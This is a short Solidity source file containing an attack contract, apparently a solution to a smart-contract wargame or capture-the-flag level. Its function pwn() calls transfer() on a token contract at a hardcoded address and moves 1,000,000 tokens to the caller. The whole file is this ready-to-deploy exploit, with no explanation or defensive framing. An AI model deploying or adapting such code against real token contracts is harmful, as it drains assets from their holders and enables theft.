// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token {
    function transfer(address _to, uint _value) public returns (bool) {
    }
}

contract TokenSol {
    function pwn() external {
        address _addr = 0x1a15e91a51d592F400B5766BF805823F090728bE;
        Token contr = Token(_addr);
        contr.transfer(msg.sender, 1000000);
    }
}